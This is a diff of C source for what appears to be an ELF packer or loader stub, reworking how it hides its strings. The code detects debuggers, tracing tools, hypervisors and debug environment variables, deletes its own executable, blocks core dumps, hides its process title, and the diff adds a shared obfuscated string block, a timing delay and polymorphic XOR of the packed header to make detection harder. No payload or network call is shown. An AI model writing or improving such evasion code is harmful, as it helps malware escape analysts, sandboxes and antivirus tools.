@@ -11,59 +11,33 @@
 #include "elf64.h"
 #include "crypto.h"
 
-#define OBF_KEY 0x5A
-
-static const uint8_t obf_gdb[]      = {0x3D, 0x3E, 0x38};
-static const uint8_t obf_strace[]   = {0x29, 0x2E, 0x28, 0x3B, 0x39, 0x3F};
-static const uint8_t obf_ltrace[]   = {0x36, 0x2E, 0x28, 0x3B, 0x39, 0x3F};
-static const uint8_t obf_radare2[]  = {0x28, 0x3B, 0x3E, 0x3B, 0x28, 0x3F, 0x68};
-static const uint8_t obf_objdump[]  = {0x35, 0x38, 0x30, 0x3E, 0x2F, 0x37, 0x2A};
-static const uint8_t obf_hexdump[]  = {0x32, 0x3F, 0x22, 0x3E, 0x2F, 0x37, 0x2A};
-static const uint8_t obf_ghidra[]   = {0x3D, 0x32, 0x33, 0x3E, 0x28, 0x3B};
-
-static const struct { const uint8_t* obf; size_t len; } tool_names[] = {
-    { obf_gdb,     sizeof(obf_gdb)     },
-    { obf_strace,  sizeof(obf_strace)  },
-    { obf_ltrace,  sizeof(obf_ltrace)  },
-    { obf_radare2, sizeof(obf_radare2) },
-    { obf_objdump, sizeof(obf_objdump) },
-    { obf_hexdump, sizeof(obf_hexdump) },
-    { obf_ghidra,  sizeof(obf_ghidra)  },
+static const struct { size_t off; size_t len; } tool_names[] = {
+    { STR_OFF_GDB,     STR_LEN_GDB     },
+    { STR_OFF_STRACE,  STR_LEN_STRACE  },
+    { STR_OFF_LTRACE,  STR_LEN_LTRACE  },
+    { STR_OFF_RADARE2, STR_LEN_RADARE2 },
+    { STR_OFF_OBJDUMP, STR_LEN_OBJDUMP },
+    { STR_OFF_HEXDUMP, STR_LEN_HEXDUMP },
+    { STR_OFF_GHIDRA,  STR_LEN_GHIDRA  },
 };
 
-static const uint8_t obf_hypervisor[] = {0x32, 0x23, 0x2A, 0x3F, 0x28, 0x2C, 0x33, 0x29, 0x35, 0x28};
-static const uint8_t obf_qemu[]       = {0x2B, 0x3F, 0x37, 0x2F};
-static const uint8_t obf_kvm[]        = {0x31, 0x2C, 0x37};
-static const uint8_t obf_xen[]        = {0x22, 0x3F, 0x34};
-static const uint8_t obf_vmware[]     = {0x2C, 0x37, 0x2D, 0x3B, 0x28, 0x3F};
-static const uint8_t obf_virtualbox[] = {0x2C, 0x33, 0x28, 0x2E, 0x2F, 0x3B, 0x36, 0x38, 0x35, 0x22};
-
-static const struct { const uint8_t* obf; size_t len; } hyper_names[] = {
-    { obf_hypervisor, sizeof(obf_hypervisor) },
-    { obf_qemu,       sizeof(obf_qemu)       },
-    { obf_kvm,        sizeof(obf_kvm)        },
-    { obf_xen,        sizeof(obf_xen)        },
-    { obf_vmware,     sizeof(obf_vmware)     },
-    { obf_virtualbox, sizeof(obf_virtualbox) },
+static const struct { size_t off; size_t len; } hyper_names[] = {
+    { STR_OFF_HYPERVISOR, STR_LEN_HYPERVISOR },
+    { STR_OFF_QEMU,       STR_LEN_QEMU       },
+    { STR_OFF_KVM,        STR_LEN_KVM        },
+    { STR_OFF_XEN,        STR_LEN_XEN        },
+    { STR_OFF_VMWARE,     STR_LEN_VMWARE     },
+    { STR_OFF_VIRTUALBOX, STR_LEN_VIRTUALBOX },
 };
 
-static const uint8_t obf_LD_PRELOAD[]   = {0x16, 0x1E, 0x05, 0x0A, 0x08, 0x1F, 0x16, 0x15, 0x1B, 0x1E};
-static const uint8_t obf_GDB_ENV[]      = {0x1D, 0x1E, 0x18};
-static const uint8_t obf_PTRACE_SCOPE[] = {0x0A, 0x0E, 0x08, 0x1B, 0x19, 0x1F, 0x05, 0x09, 0x19, 0x15, 0x0A, 0x1F};
-static const uint8_t obf_STRACE_LOG[]   = {0x09, 0x0E, 0x08, 0x1B, 0x19, 0x1F, 0x05, 0x16, 0x15, 0x1D};
-static const uint8_t obf_LTRACE_LOG[]   = {0x16, 0x0E, 0x08, 0x1B, 0x19, 0x1F, 0x05, 0x16, 0x15, 0x1D};
-static const uint8_t obf_RADARE2_LOG[]  = {0x08, 0x1B, 0x1E, 0x1B, 0x08, 0x1F, 0x68, 0x05, 0x16, 0x15, 0x1D};
-
-static const struct { const uint8_t* obf; size_t len; } env_names[] = {
-    { obf_LD_PRELOAD,   sizeof(obf_LD_PRELOAD)   },
-    { obf_GDB_ENV,      sizeof(obf_GDB_ENV)      },
-    { obf_PTRACE_SCOPE, sizeof(obf_PTRACE_SCOPE) },
-    { obf_STRACE_LOG,   sizeof(obf_STRACE_LOG)   },
-    { obf_LTRACE_LOG,   sizeof(obf_LTRACE_LOG)   },
-    { obf_RADARE2_LOG,  sizeof(obf_RADARE2_LOG)  },
+static const struct { size_t off; size_t len; } env_names[] = {
+    { STR_OFF_LD_PRELOAD,   STR_LEN_LD_PRELOAD   },
+    { STR_OFF_GDB_ENV,      STR_LEN_GDB_ENV      },
+    { STR_OFF_PTRACE_SCOPE, STR_LEN_PTRACE_SCOPE },
+    { STR_OFF_STRACE_LOG,   STR_LEN_STRACE_LOG   },
+    { STR_OFF_LTRACE_LOG,   STR_LEN_LTRACE_LOG   },
+    { STR_OFF_RADARE2_LOG,  STR_LEN_RADARE2_LOG  },
 };
-
-static const uint8_t obf_TracerPid[] = {0x0E, 0x28, 0x3B, 0x39, 0x3F, 0x28, 0x0A, 0x33, 0x3E, 0x60};
 
 int detect_ptrace_arm64(void) {
     pid_t child = fork();
@@ -85,13 +59,15 @@ int check_proc_status(void) {
     if (!status_file) return 0;
 
     char tracer_prefix[16];
-    deobf_str_xor(tracer_prefix, obf_TracerPid, sizeof(obf_TracerPid), OBF_KEY);
-    tracer_prefix[sizeof(obf_TracerPid)] = '\0';
+    deobf_str_xor(tracer_prefix,
+                  (const uint8_t*)g_obf_str_block + STR_OFF_TRACERPID,
+                  STR_LEN_TRACERPID, (uint8_t)g_str_xor_key);
+    tracer_prefix[STR_LEN_TRACERPID] = '\0';
 
     char line[256];
     while (fgets(line, sizeof(line), status_file)) {
-        if (strncmp(line, tracer_prefix, sizeof(obf_TracerPid)) == 0) {
-            int tracer_pid = atoi(line + sizeof(obf_TracerPid));
+        if (strncmp(line, tracer_prefix, STR_LEN_TRACERPID) == 0) {
+            int tracer_pid = atoi(line + STR_LEN_TRACERPID);
             fclose(status_file);
             secure_memory_wipe(tracer_prefix, sizeof(tracer_prefix));
             return tracer_pid != 0;
@@ -128,7 +104,9 @@ int check_parent_process(void) {
             for (size_t i = 0; i < sizeof(tool_names) / sizeof(tool_names[0]); i++) {
                 size_t len = tool_names[i].len;
                 if (len >= sizeof(decoded)) continue;
-                deobf_str_xor(decoded, tool_names[i].obf, len, OBF_KEY);
+                deobf_str_xor(decoded,
+                              (const uint8_t*)g_obf_str_block + tool_names[i].off,
+                              len, (uint8_t)g_str_xor_key);
                 decoded[len] = '\0';
                 if (strcmp(parent_name, decoded) == 0) {
                     secure_memory_wipe(decoded, sizeof(decoded));
@@ -158,7 +136,9 @@ int detect_virtualization(void) {
         for (size_t i = 0; i < sizeof(hyper_names) / sizeof(hyper_names[0]); i++) {
             size_t len = hyper_names[i].len;
             if (len >= sizeof(decoded)) continue;
-            deobf_str_xor(decoded, hyper_names[i].obf, len, OBF_KEY);
+            deobf_str_xor(decoded,
+                          (const uint8_t*)g_obf_str_block + hyper_names[i].off,
+                          len, (uint8_t)g_str_xor_key);
             decoded[len] = '\0';
             if (strstr(line, decoded)) {
                 fclose(cpuinfo);
@@ -186,7 +166,9 @@ int check_debug_environment(void) {
     for (size_t i = 0; i < sizeof(env_names) / sizeof(env_names[0]); i++) {
         size_t len = env_names[i].len;
         if (len >= sizeof(decoded)) continue;
-        deobf_str_xor(decoded, env_names[i].obf, len, OBF_KEY);
+        deobf_str_xor(decoded,
+                      (const uint8_t*)g_obf_str_block + env_names[i].off,
+                      len, (uint8_t)g_str_xor_key);
         decoded[len] = '\0';
         if (getenv(decoded)) { found = 1; break; }
     }
@@ -231,9 +213,11 @@ pack_header_t* find_packed_header(const uint8_t* data, size_t data_size) {
     if (data_size < sizeof(pack_header_t)) {
         return NULL;
     }
+
+    uint32_t needle = g_packed_magic;
     for (size_t i = data_size - sizeof(pack_header_t); i > 0; i--) {
         pack_header_t* header = (pack_header_t*)(data + i);
-        if (header->magic == PACKED_MAGIC) {
+        if (header->magic == needle) {
             return header;
         }
     }
@@ -252,6 +236,8 @@ int main(int argc, char* argv[], char* envp[]) {
     unlink(argv[0]);
     prevent_core_dumps();
     hide_process_title(argc, argv);
+
+    noise_delay(150);
 
     self_fp = fopen("/proc/self/exe", "rb");
     if (!self_fp) {
@@ -287,6 +273,13 @@ int main(int argc, char* argv[], char* envp[]) {
         secure_memory_wipe(self_data, self_size);
         free(self_data);
         return 1;
+    }
+
+    {
+        uint8_t* hb = (uint8_t*)header;
+        size_t   hdr_body = sizeof(pack_header_t) - sizeof(uint32_t);
+        for (size_t i = 0; i < hdr_body; i++)
+            hb[sizeof(uint32_t) + i] ^= g_pack_polymorph[i];
     }
 
     if (comprehensive_anti_debug_check()) {
